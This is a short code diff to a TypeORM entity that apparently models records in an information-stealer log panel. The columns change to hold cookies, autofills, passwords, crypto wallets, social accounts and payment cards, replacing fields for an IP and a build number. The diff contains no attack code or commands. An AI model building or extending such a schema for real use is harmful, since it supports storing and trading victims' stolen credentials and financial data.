@@ -7,24 +7,27 @@ export class Set {
     id: number;
 
     @Column({ unique: false })
-    num: string;
+    total: string;
 
     @Column({ unique: false })
-    ip: string;
+    cookies: string;
 
     @Column({ unique: false })
-    browse: string;
+    autofills: string;
 
     @Column({ unique: false })
-    passwords: number;
+    passwords: string;
 
     @Column({ unique: false })
-    wallets: number;
+    wallets: string;
 
     @Column({ unique: false })
-    build: number;
+    social: string;
 
     @Column({ unique: false })
-    date: Date
+    cards: string;
+
+    @Column({ unique: false })
+    date: string;
 
 }
